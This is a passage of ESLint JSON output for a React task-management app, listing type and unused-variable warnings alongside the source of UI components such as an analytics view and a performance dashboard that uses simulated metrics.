        <p className=\"text-lg text-muted-foreground max-w-md\">\n            {name ? `Loading ${name}...` : 'Initializing the most beautiful task management experience'}\n          </p>\n        </motion.div>\n\n        <motion.div\n          initial={{ opacity: 0 }}\n          animate={{ opacity: 1 }}\n          transition={{ delay: 0.5 }}\n          className=\"flex flex-col items-center gap-4\"\n        >\n          <LoadingSpinner size={40} />\n          \n          {/* Loading steps */}\n          <motion.div\n            initial={{ opacity: 0, y: 10 }}\n            animate={{ opacity: 1, y: 0 }}\n            transition={{ delay: 1 }}\n            className=\"text-sm text-muted-foreground\"\n          >\n            Preparing your workspace...\n          </motion.div>\n        </motion.div>\n      </div>\n    </motion.div>\n  </div>\n);\n\nexport const SuspenseWrapper: React.FC<SuspenseWrapperProps> = ({\n  children,\n  fallback,\n  level = 'component',\n  name,\n}) => {\n  const getFallbackComponent = () => {\n    if (fallback) return fallback;\n    \n    switch (level) {\n      case 'app':\n        return <_AppLevelFallback name={name} />;\n      case 'route':\n        return <_RouteLevelFallback name={name} />;\n      case 'component':\n      default:\n        return <_ComponentLevelFallback name={name} />;\n    }\n  };\n\n  return (\n    <Suspense fallback={getFallbackComponent()}>\n      {children}\n    </Suspense>\n  );\n};\n\n// Convenience wrapper for lazy-loaded components\nexport const withSuspense = <P extends object>(\n  Component: React.ComponentType<P>,\n  suspenseProps?: Omit<SuspenseWrapperProps, 'children'>\n) => {\n  const WrappedComponent = (props: P) => (\n    <SuspenseWrapper {...suspenseProps}>\n      <Component {...props} />\n    </SuspenseWrapper>\n  );\n\n  WrappedComponent.displayName = `withSuspense(${Component.displayName || Component.name})`;\n  \n  return WrappedComponent;\n};\n\nexport default SuspenseWrapper;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/ui/VirtualizedList.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":4,"column":10,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":4,"endColumn":13,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[69,72],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[69,72],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":5,"column":22,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":5,"endColumn":25,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[96,99],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[96,99],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React from 'react'\n\ninterface VirtualizedListProps {\n  items: any[]\n  renderItem: (item: any, index: number) => React.ReactNode\n  itemHeight?: number\n  className?: string\n}\n\nexport function VirtualizedList({ \n  items, \n  renderItem, \n  itemHeight = 100,\n  className \n}: VirtualizedListProps) {\n  // Simple implementation - in a real app you'd use react-window or similar\n  return (\n    <div className={className}>\n      {items.map((item, index) => (\n        <div key={item.id || index} style={{ height: itemHeight }}>\n          {renderItem(item, index)}\n        </div>\n      ))}\n    </div>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/AnalyticsView.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":120,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":120,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3385,3388],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3385,3388],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React from 'react'\nimport { motion } from 'framer-motion'\nimport { \n  TrendingUp, \n  TrendingDown, \n  Target, \n  CheckCircle2, \n  Clock, \n  AlertTriangle,\n  BarChart3,\n  PieChart,\n  Calendar,\n  Zap\n} from 'lucide-react'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { cn } from '@/lib/utils'\n\ninterface MetricCardProps {\n  title: string\n  value: string | number\n  change?: string\n  trend?: 'up' | 'down' | 'neutral'\n  icon: React.ComponentType<{ className?: string }>\n  color?: string\n  index: number\n}\n\nfunction MetricCard({ title, value, change, trend, icon: Icon, color = 'blue', index }: MetricCardProps) {\n  const colorClasses = {\n    blue: 'from-blue-500 to-blue-600',\n    emerald: 'from-emerald-500 to-emerald-600',\n    orange: 'from-orange-500 to-orange-600',\n    red: 'from-red-500 to-red-600',\n    purple: 'from-purple-500 to-purple-600'\n  }\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: 20, scale: 0.9 }}\n      animate={{ opacity: 1, y: 0, scale: 1 }}\n      transition={{ delay: index * 0.1 }}\n      whileHover={{ \n        scale: 1.02,\n        boxShadow: \"0 20px 25px -5px rgba(0, 0, 0, 0.1)\"\n      }}\n      className=\"relative overflow-hidden rounded-xl bg-card border border-border/50 p-6 glass-morphism\"\n    >\n      {/* Background gradient */}\n      <div className={cn(\n        \"absolute top-0 right-0 w-20 h-20 opacity-10 rounded-bl-3xl\",\n        `bg-gradient-to-br ${colorClasses[color as keyof typeof colorClasses]}`\n      )} />\n      \n      <div className=\"relative\">\n        <div className=\"flex items-center justify-between mb-4\">\n          <div className={cn(\n            \"p-3 rounded-lg bg-gradient-to-br\",\n            colorClasses[color as keyof typeof colorClasses]\n          )}>\n            <Icon className=\"w-6 h-6 text-white\" />\n          </div>\n          \n          {change && (\n            <div className={cn(\n              \"flex items-center space-x-1 text-sm\",\n              trend === 'up' && \"text-emerald-600\",\n              trend === 'down' && \"text-red-600\",\n              trend === 'neutral' && \"text-muted-foreground\"\n            )}>\n              {trend === 'up' && <TrendingUp className=\"w-4 h-4\" />}\n              {trend === 'down' && <TrendingDown className=\"w-4 h-4\" />}\n              <span>{change}</span>\n            </div>\n          )}\n        </div>\n        \n        <div>\n          <h3 className=\"text-2xl font-bold mb-1\">{value}</h3>\n          <p className=\"text-sm text-muted-foreground\">{title}</p>\n        </div>\n      </div>\n    </motion.div>\n  )\n}\n\nexport function AnalyticsView() {\n  const { analytics } = useTaskStore()\n\n  const metrics = [\n    {\n      title: 'Total Tasks',\n      value: analytics.totalTasks,\n      icon: Target,\n      color: 'blue'\n    },\n    {\n      title: 'Completed',\n      value: analytics.completedTasks,\n      change: `${Math.round(analytics.completionRate)}%`,\n      trend: 'up' as const,\n      icon: CheckCircle2,\n      color: 'emerald'\n    },\n    {\n      title: 'In Progress',\n      value: analytics.inProgressTasks,\n      icon: Clock,\n      color: 'orange'\n    },\n    {\n      title: 'High Priority',\n      value: analytics.tasksByPriority.high || 0,\n      icon: AlertTriangle,\n      color: 'red'\n    },\n    {\n      title: 'This Week',\n      value: analytics.velocityMetrics.tasksCompletedThisWeek,\n      change: '+12%',\n      trend: analytics.velocityMetrics.trend as any,\n      icon: Zap,\n      color: 'purple'\n    },\n    {\n      title: 'Avg. Completion',\n      value: `${analytics.averageCompletionTime}d`,\n      icon: Calendar,\n      color: 'blue'\n    }\n  ]\n\n  return (\n    <motion.div \n      className=\"h-full overflow-auto p-6\"\n      initial={{ opacity: 0 }}\n      animate={{ opacity: 1 }}\n      transition={{ duration: 0.5 }}\n    >\n      {/* Header */}\n      <motion.div \n        className=\"mb-8\"\n        initial={{ y: -20, opacity: 0 }}\n        animate={{ y: 0, opacity: 1 }}\n        transition={{ duration: 0.5 }}\n      >\n        <h2 className=\"text-3xl font-bold gradient-text mb-2\">Analytics Dashboard</h2>\n        <p className=\"text-muted-foreground\">\n          Track your productivity and task completion metrics\n        </p>\n      </motion.div>\n\n      {/* Metrics Grid */}\n      <div className=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8\">\n        {metrics.map((metric, index) => (\n          <MetricCard key={metric.title} {...metric} index={index} />\n        ))}\n      </div>\n\n      {/* Charts Section */}\n      <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8\">\n        {/* Completion Rate Chart */}\n        <motion.div\n          initial={{ opacity: 0, x: -20 }}\n          animate={{ opacity: 1, x: 0 }}\n          transition={{ delay: 0.7 }}\n          className=\"bg-card border border-border/50 rounded-xl p-6 glass-morphism\"\n        >\n          <div className=\"flex items-center justify-between mb-6\">\n            <h3 className=\"text-lg font-semibold\">Completion Rate</h3>\n            <PieChart className=\"w-5 h-5 text-muted-foreground\" />\n          </div>\n          \n          <div className=\"relative w-48 h-48 mx-auto\">\n            <svg className=\"w-full h-full transform -rotate-90\" viewBox=\"0 0 100 100\">\n              {/* Background circle */}\n              <circle\n                cx=\"50\"\n                cy=\"50\"\n                r=\"40\"\n                fill=\"none\"\n                stroke=\"currentColor\"\n                strokeWidth=\"8\"\n                className=\"text-muted/20\"\n              />\n              {/* Progress circle */}\n              <motion.circle\n                cx=\"50\"\n                cy=\"50\"\n                r=\"40\"\n                fill=\"none\"\n                stroke=\"url(#progressGradient)\"\n                strokeWidth=\"8\"\n                strokeLinecap=\"round\"\n                strokeDasharray={`${2 * Math.PI * 40}`}\n                initial={{ strokeDashoffset: 2 * Math.PI * 40 }}\n                animate={{ \n                  strokeDashoffset: 2 * Math.PI * 40 * (1 - analytics.completionRate / 100)\n                }}\n                transition={{ duration: 1.5, ease: \"easeOut\" }}\n              />\n              <defs>\n                <linearGradient id=\"progressGradient\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"0%\">\n                  <stop offset=\"0%\" stopColor=\"#3b82f6\" />\n                  <stop offset=\"50%\" stopColor=\"#8b5cf6\" />\n                  <stop offset=\"100%\" stopColor=\"#06b6d4\" />\n                </linearGradient>\n              </defs>\n            </svg>\n            <div className=\"absolute inset-0 flex items-center justify-center\">\n              <div className=\"text-center\">\n                <div className=\"text-2xl font-bold\">{Math.round(analytics.completionRate)}%</div>\n                <div className=\"text-xs text-muted-foreground\">Complete</div>\n              </div>\n            </div>\n          </div>\n        </motion.div>\n\n        {/* Burndown Chart */}\n        <motion.div\n          initial={{ opacity: 0, x: 20 }}\n          animate={{ opacity: 1, x: 0 }}\n          transition={{ delay: 0.8 }}\n          className=\"bg-card border border-border/50 rounded-xl p-6 glass-morphism\"\n        >\n          <div className=\"flex items-center justify-between mb-6\">\n            <h3 className=\"text-lg font-semibold\">Task Burndown</h3>\n            <BarChart3 className=\"w-5 h-5 text-muted-foreground\" />\n          </div>\n          \n          <div className=\"h-48 flex items-end justify-between space-x-1\">\n            {analytics.burndownData.slice(-7).map((point, index) => (\n              <motion.div\n                key={point.date}\n                className=\"flex flex-col items-center flex-1\"\n                initial={{ height: 0 }}\n                animate={{ height: 'auto' }}\n                transition={{ delay: 0.9 + index * 0.1 }}\n              >\n                <motion.div\n                  className=\"w-full bg-gradient-to-t from-blue-500 to-purple-500 rounded-t-sm mb-2\"\n                  initial={{ height: 0 }}\n                  animate={{ height: `${(point.completed / analytics.totalTasks) * 140}px` }}\n                  transition={{ duration: 0.5, delay: 0.9 + index * 0.1 }}\n                />\n                <span className=\"text-xs text-muted-foreground\">\n                  {new Date(point.date).toLocaleDateString('en-US', { weekday: 'short' })}\n                </span>\n              </motion.div>\n            ))}\n          </div>\n        </motion.div>\n      </div>\n\n      {/* Status Breakdown */}\n      <motion.div\n        initial={{ opacity: 0, y: 20 }}\n        animate={{ opacity: 1, y: 0 }}\n        transition={{ delay: 0.9 }}\n        className=\"bg-card border border-border/50 rounded-xl p-6 glass-morphism\"\n      >\n        <h3 className=\"text-lg font-semibold mb-6\">Task Status Breakdown</h3>\n        \n        <div className=\"space-y-4\">\n          {Object.entries(analytics.tasksByStatus).map(([status, count], index) => {\n            const percentage = analytics.totalTasks > 0 ? (count / analytics.totalTasks) * 100 : 0\n            const colors = {\n              done: 'bg-emerald-500',\n              'in-progress': 'bg-blue-500',\n              pending: 'bg-gray-400',\n              review: 'bg-purple-500',\n              deferred: 'bg-yellow-500',\n              cancelled: 'bg-red-500'\n            }\n            \n            return (\n              <div key={status} className=\"flex items-center justify-between\">\n                <div className=\"flex items-center space-x-3\">\n                  <div className={cn(\"w-3 h-3 rounded-full\", colors[status as keyof typeof colors])} />\n                  <span className=\"capitalize text-sm\">{status.replace('-', ' ')}</span>\n                </div>\n                <div className=\"flex items-center space-x-3\">\n                  <div className=\"w-32 bg-muted/30 rounded-full h-2 overflow-hidden\">\n                    <motion.div\n                      className={cn(\"h-full rounded-full\", colors[status as keyof typeof colors])}\n                      initial={{ width: 0 }}\n                      animate={{ width: `${percentage}%` }}\n                      transition={{ duration: 0.8, delay: 1 + index * 0.1 }}\n                    />\n                  </div>\n                  <span className=\"text-sm font-medium w-8\">{count}</span>\n                </div>\n              </div>\n            )\n          })}\n        </div>\n      </motion.div>\n    </motion.div>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/CalendarView.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/KanbanView.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/views/PerformanceDashboard.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Zap' is defined but never used.","line":8,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":8,"endColumn":6},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'CheckCircle2' is defined but never used.","line":10,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":10,"endColumn":15},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Gauge' is defined but never used.","line":14,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":14,"endColumn":8},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'RefreshCw' is defined but never used.","line":16,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":16,"endColumn":12},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":169,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":169,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5100,5103],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5100,5103],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":227,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":227,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6465,6468],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6465,6468],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":258,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":258,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7322,7325],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7322,7325],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'setAlerts' is assigned a value but never used.","line":384,"column":18,"nodeType":null,"messageId":"unusedVar","endLine":384,"endColumn":27}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":8,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React, { useState, useEffect, useRef } from 'react'\nimport { motion } from 'framer-motion'\nimport ReactApexChart from 'react-apexcharts'\nimport { \n  Cpu, \n  MemoryStick, \n  Activity, \n  Zap,\n  AlertTriangle,\n  CheckCircle2,\n  TrendingUp,\n  TrendingDown,\n  Monitor,\n  Gauge,\n  BarChart3,\n  RefreshCw,\n  Settings,\n  Download,\n  Play,\n  Pause\n} from 'lucide-react'\nimport { cn } from '@/lib/utils'\nimport { defaultPerformanceDashboardConfig, getAlertThresholdByMetricId } from '@/lib/config/performance-dashboard'\nimport type { PerformanceMetric } from '@/lib/performance-database'\n\ninterface MetricCardProps {\n  title: string\n  value: string | number\n  unit?: string\n  change?: string\n  trend?: 'up' | 'down' | 'neutral'\n  status?: 'good' | 'warning' | 'critical'\n  icon: React.ComponentType<{ className?: string }>\n  color?: string\n  index: number\n}\n\nfunction MetricCard({ title, value, unit, change, trend, status, icon: Icon, color = 'blue', index }: MetricCardProps) {\n  const colorClasses = {\n    blue: 'from-blue-500 to-blue-600',\n    emerald: 'from-emerald-500 to-emerald-600',\n    orange: 'from-orange-500 to-orange-600',\n    red: 'from-red-500 to-red-600',\n    purple: 'from-purple-500 to-purple-600',\n    yellow: 'from-yellow-500 to-yellow-600'\n  }\n\n  const statusColors = {\n    good: 'text-emerald-600 border-emerald-200 bg-emerald-50',\n    warning: 'text-yellow-600 border-yellow-200 bg-yellow-50',\n    critical: 'text-red-600 border-red-200 bg-red-50'\n  }\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: 20, scale: 0.9 }}\n      animate={{ opacity: 1, y: 0, scale: 1 }}\n      transition={{ delay: index * 0.1 }}\n      whileHover={{ \n        scale: 1.02,\n        boxShadow: \"0 20px 25px -5px rgba(0, 0, 0, 0.1)\"\n      }}\n      className=\"relative overflow-hidden rounded-xl bg-card border border-border/50 p-6 glass-morphism\"\n    >\n      {/* Background gradient */}\n      <div className={cn(\n        \"absolute top-0 right-0 w-20 h-20 opacity-10 rounded-bl-3xl\",\n        `bg-gradient-to-br ${colorClasses[color as keyof typeof colorClasses]}`\n      )} />\n      \n      <div className=\"relative\">\n        <div className=\"flex items-center justify-between mb-4\">\n          <div className={cn(\n            \"p-3 rounded-lg bg-gradient-to-br\",\n            colorClasses[color as keyof typeof colorClasses]\n          )}>\n            <Icon className=\"w-6 h-6 text-white\" />\n          </div>\n          \n          <div className=\"flex flex-col items-end space-y-1\">\n            {status && (\n              <div className={cn(\n                \"px-2 py-1 rounded-full text-xs font-medium border\",\n                statusColors[status]\n              )}>\n                {status.toUpperCase()}\n              </div>\n            )}\n            \n            {change && (\n              <div className={cn(\n                \"flex items-center space-x-1 text-sm\",\n                trend === 'up' && \"text-emerald-600\",\n                trend === 'down' && \"text-red-600\",\n                trend === 'neutral' && \"text-muted-foreground\"\n              )}>\n                {trend === 'up' && <TrendingUp className=\"w-4 h-4\" />}\n                {trend === 'down' && <TrendingDown className=\"w-4 h-4\" />}\n                <span>{change}</span>\n              </div>\n            )}\n          </div>\n        </div>\n        \n        <div>\n          <h3 className=\"text-2xl font-bold mb-1\">\n            {value}\n            {unit && <span className=\"text-sm text-muted-foreground ml-1\">{unit}</span>}\n          </h3>\n          <p className=\"text-sm text-muted-foreground\">{title}</p>\n        </div>\n      </div>\n    </motion.div>\n  )\n}\n\ninterface ChartWidgetProps {\n  title: string\n  metricId: string\n  data: PerformanceMetric[]\n  chartType: 'line' | 'area' | 'bar' | 'gauge'\n  height?: number\n  showControls?: boolean\n  index: number\n}\n\nfunction ChartWidget({ title, metricId, data, chartType, height = 300, showControls = true, index }: ChartWidgetProps) {\n  const [isRealTime, setIsRealTime] = useState(true)\n  \n  // Extract data for the chart based on metric type\n  const getChartData = () => {\n    if (!data || data.length === 0) return []\n    \n    return data.map(metric => {\n      let value = 0\n      switch (metricId) {\n        case 'cpu_usage':\n          value = metric.system?.cpu?.usage || 0\n          break\n        case 'memory_usage':\n          value = metric.system?.memory?.usagePercent || 0\n          break\n        case 'fps':\n          value = metric.application?.rendering?.fps || 0\n          break\n        case 'memory_heap_used':\n          value = (metric.system?.memory?.process?.heapUsed || 0) / (1024 * 1024) // Convert to MB\n          break\n        case 'jank_count':\n          value = metric.application?.rendering?.jank || 0\n          break\n        default:\n          value = 0\n      }\n      \n      return {\n        x: metric.timestamp,\n        y: value\n      }\n    }).slice(-50) // Last 50 data points for performance\n  }\n\n  const chartData = getChartData()\n  \n  const getChartOptions = () => {\n    const baseOptions = {\n      chart: {\n        id: metricId,\n        type: chartType as any,\n        animations: {\n          enabled: true,\n          easing: 'easeinout',\n          speed: 800,\n          animateGradually: {\n            enabled: true,\n            delay: 150\n          },\n          dynamicAnimation: {\n            enabled: true,\n            speed: 350\n          }\n        },\n        toolbar: {\n          show: showControls,\n          tools: {\n            download: true,\n            selection: true,\n            zoom: true,\n            zoomin: true,\n            zoomout: true,\n            pan: true,\n            reset: true\n          }\n        },\n        background: 'transparent'\n      },\n      theme: {\n        mode: 'light' as const\n      },\n      colors: ['#3b82f6', '#8b5cf6', '#06b6d4', '#10b981', '#f59e0b'],\n      stroke: {\n        width: 2,\n        curve: 'smooth' as const\n      },\n      fill: {\n        type: chartType === 'area' ? 'gradient' : 'solid',\n        gradient: {\n          shadeIntensity: 1,\n          opacityFrom: 0.7,\n          opacityTo: 0.3,\n          stops: [0, 100]\n        }\n      },\n      grid: {\n        show: true,\n        borderColor: '#e5e7eb',\n        strokeDashArray: 3,\n        position: 'back' as const\n      },\n      xaxis: {\n        type: 'datetime' as const,\n        labels: {\n          style: {\n            colors: '#6b7280',\n            fontSize: '12px'\n          },\n          formatter: (value: any) => {\n            return new Date(value).toLocaleTimeString('en-US', { \n              hour12: false, \n              hour: '2-digit', \n              minute: '2-digit' \n            })\n          }\n        }\n      },\n      yaxis: {\n        labels: {\n          style: {\n            colors: '#6b7280',\n            fontSize: '12px'\n          },\n          formatter: (value: number) => {\n            if (metricId === 'memory_heap_used') {\n              return `${value.toFixed(1)} MB`\n            } else if (metricId === 'fps') {\n              return `${value.toFixed(0)} FPS`\n            } else if (metricId.includes('usage')) {\n              return `${value.toFixed(1)}%`\n            }\n            return value.toFixed(1)\n          }\n        }\n      },\n      tooltip: {\n        enabled: true,\n        theme: 'light',\n        x: {\n          formatter: (value: any) => {\n            return new Date(value).toLocaleString()\n          }\n        },\n        y: {\n          formatter: (value: number) => {\n            if (metricId === 'memory_heap_used') {\n              return `${value.toFixed(2)} MB`\n            } else if (metricId === 'fps') {\n              return `${value.toFixed(1)} FPS`\n            } else if (metricId.includes('usage')) {\n              return `${value.toFixed(1)}%`\n            }\n            return value.toFixed(2)\n          }\n        }\n      },\n      responsive: [\n        {\n          breakpoint: 768,\n          options: {\n            chart: {\n              height: height * 0.8\n            }\n          }\n        }\n      ]\n    }\n\n    if (chartType === 'gauge') {\n      const latestValue = chartData.length > 0 ? chartData[chartData.length - 1].y : 0\n      return {\n        ...baseOptions,\n        chart: {\n          ...baseOptions.chart,\n          type: 'radialBar'\n        },\n        plotOptions: {\n          radialBar: {\n            startAngle: -135,\n            endAngle: 225,\n            hollow: {\n              margin: 0,\n              size: '70%',\n              background: 'transparent'\n            },\n            track: {\n              background: '#e5e7eb',\n              strokeWidth: '67%',\n              margin: 0\n            },\n            dataLabels: {\n              name: {\n                show: false\n              },\n              value: {\n                show: true,\n                fontSize: '24px',\n                fontWeight: 'bold',\n                color: '#374151',\n                formatter: (val: number) => {\n                  if (metricId === 'fps') return `${val.toFixed(0)}`\n                  return `${val.toFixed(1)}%`\n                }\n              }\n            }\n          }\n        },\n        series: [latestValue]\n      }\n    }\n\n    return baseOptions\n  }\n\n  const series = chartType === 'gauge' \n    ? [chartData.length > 0 ? chartData[chartData.length - 1].y : 0]\n    : [{\n        name: title,\n        data: chartData\n      }]\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, scale: 0.95 }}\n      animate={{ opacity: 1, scale: 1 }}\n      transition={{ delay: index * 0.2 }}\n      className=\"bg-card border border-border/50 rounded-xl p-6 glass-morphism\"\n    >\n      <div className=\"flex items-center justify-between mb-4\">\n        <h3 className=\"text-lg font-semibold\">{title}</h3>\n        <div className=\"flex items-center space-x-2\">\n          {showControls && (\n            <button\n              onClick={() => setIsRealTime(!isRealTime)}\n              className={cn(\n                \"p-2 rounded-lg transition-colors\",\n                isRealTime \n                  ? \"bg-emerald-100 text-emerald-600 hover:bg-emerald-200\" \n                  : \"bg-gray-100 text-gray-600 hover:bg-gray-200\"\n              )}\n              title={isRealTime ? \"Pause real-time updates\" : \"Resume real-time updates\"}\n            >\n              {isRealTime ? <Pause className=\"w-4 h-4\" /> : <Play className=\"w-4 h-4\" />}\n            </button>\n          )}\n          <BarChart3 className=\"w-5 h-5 text-muted-foreground\" />\n        </div>\n      </div>\n      \n      <div className=\"w-full\">\n        <ReactApexChart\n          options={getChartOptions()}\n          series={series}\n          type={chartType === 'gauge' ? 'radialBar' : chartType}\n          height={height}\n        />\n      </div>\n    </motion.div>\n  )\n}\n\nexport function PerformanceDashboard() {\n  const [isMonitoring, setIsMonitoring] = useState(false)\n  const [currentMetrics, setCurrentMetrics] = useState<PerformanceMetric | null>(null)\n  const [metricsHistory, setMetricsHistory] = useState<PerformanceMetric[]>([])\n  const [alerts, setAlerts] = useState<Array<{ type: string; message: string; severity: 'warning' | 'critical' }>>([])\n  const intervalRef = useRef<NodeJS.Timeout | null>(null)\n\n  // Simulate real-time data collection\n  useEffect(() => {\n    if (isMonitoring) {\n      intervalRef.current = setInterval(() => {\n        // Simulate metric data - in real implementation, this would come from the performance-monitor.js\n        const mockMetric: PerformanceMetric = {\n          timestamp: Date.now(),\n          system: {\n            cpu: {\n              usage: Math.random() * 100,\n              loadAverage: [Math.random() * 2, Math.random() * 2, Math.random() * 2],\n              cores: 8\n            },\n            memory: {\n              total: 16 * 1024 * 1024 * 1024, // 16GB\n              free: Math.random() * 8 * 1024 * 1024 * 1024,\n              used: Math.random() * 8 * 1024 * 1024 * 1024,\n              usagePercent: Math.random() * 100,\n              process: {\n                heapUsed: Math.random() * 200 * 1024 * 1024, // 0-200MB\n                heapTotal: 300 * 1024 * 1024, // 300MB\n                external: Math.random() * 50 * 1024 * 1024,\n                rss: Math.random() * 400 * 1024 * 1024\n              }\n            },\n            uptime: Date.now() - (Math.random() * 86400000) // Random uptime up to 24h\n          },\n          application: {\n            rendering: {\n              fps: 30 + Math.random() * 30, // 30-60 FPS\n              jank: Math.floor(Math.random() * 5), // 0-5 jank events\n              paintTime: Math.random() * 20 + 5 // 5-25ms\n            },\n            network: {\n              requestCount: Math.floor(Math.random() * 100),\n              avgLatency: Math.random() * 500 + 50,\n              errorRate: Math.random() * 0.05\n            },\n            errors: {\n              count: Math.floor(Math.random() * 3),\n              types: ['javascript', 'network']\n            }\n          },\n          metadata: {\n            platform: process.platform,\n            arch: process.arch,\n            nodeVersion: process.version,\n            monitorVersion: '1.0.0'\n          }\n        }\n\n        setCurrentMetrics(mockMetric)\n        setMetricsHistory(prev => [...prev.slice(-100), mockMetric]) // Keep last 100 metrics\n      }, 5000) // Update every 5 seconds\n    } else {\n      if (intervalRef.current) {\n        clearInterval(intervalRef.current)\n        intervalRef.current = null\n      }\n    }\n\n    return () => {\n      if (intervalRef.current) {\n        clearInterval(intervalRef.current)\n      }\n    }\n  }, [isMonitoring])\n\n  const getMetricValue = (metricId: string): { value: number; unit: string; status: 'good' | 'warning' | 'critical' } => {\n    if (!currentMetrics) return { value: 0, unit: '', status: 'good' }\n    \n    const alertConfig = getAlertThresholdByMetricId(defaultPerformanceDashboardConfig, metricId)\n    \n    let value = 0\n    let unit = ''\n    \n    switch (metricId) {\n      case 'cpu_usage':\n        value = currentMetrics.system?.cpu?.usage || 0\n        unit = '%'\n        break\n      case 'memory_usage':\n        value = currentMetrics.system?.memory?.usagePercent || 0\n        unit = '%'\n        break\n      case 'fps':\n        value = currentMetrics.application?.rendering?.fps || 0\n        unit = 'FPS'\n        break\n      case 'memory_heap_used':\n        value = (currentMetrics.system?.memory?.process?.heapUsed || 0) / (1024 * 1024)\n        unit = 'MB'\n        break\n      case 'jank_count':\n        value = currentMetrics.application?.rendering?.jank || 0\n        unit = 'events'\n        break\n    }\n    \n    let status: 'good' | 'warning' | 'critical' = 'good'\n    if (alertConfig) {\n      if (metricId === 'fps') {\n        // For FPS, lower is worse\n        if (value < alertConfig.criticalThreshold) status = 'critical'\n        else if (value < alertConfig.warningThreshold) status = 'warning'\n      } else {\n        // For other metrics, higher is worse\n        if (value > alertConfig.criticalThreshold) status = 'critical'\n        else if (value > alertConfig.warningThreshold) status = 'warning'\n      }\n    }\n    \n    return { value, unit, status }\n  }\n\n  const metrics = [\n    {\n      id: 'cpu_usage',\n      title: 'CPU Usage',\n      icon: Cpu,\n      color: 'blue'\n    },\n    {\n      id: 'memory_usage',\n      title: 'Memory Usage',\n      icon: MemoryStick,\n      color: 'purple'\n    },\n    {\n      id: 'fps',\n      title: 'Frame Rate',\n      icon: Activity,\n      color: 'emerald'\n    },\n    {\n      id: 'memory_heap_used',\n      title: 'Heap Memory',\n      icon: Monitor,\n      color: 